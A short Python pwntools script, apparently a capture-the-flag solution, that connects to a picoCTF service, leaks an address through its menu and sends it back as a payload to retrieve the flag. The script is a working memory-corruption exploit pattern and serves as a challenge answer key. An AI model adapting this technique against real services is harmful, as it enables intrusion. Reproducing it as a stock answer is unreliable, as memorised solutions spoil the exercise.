# Credits to @ZeroDayTea
from pwn import *

io = remote('mercury.picoctf.net', 4504)  # replace with your port

io.recvuntil("it\n")
io.sendline('s')
io.recvuntil("...")

payload = p32(int(io.recvline().strip(), 16))

io.recvuntil("it\n")
io.sendline('i')
io.recvuntil('?')
io.sendline('y')

io.recvuntil("it\n")
io.sendline('l')
io.recvline()
io.sendline(payload)

io.recvuntil(':\n')
print(io.recvline().strip().decode())
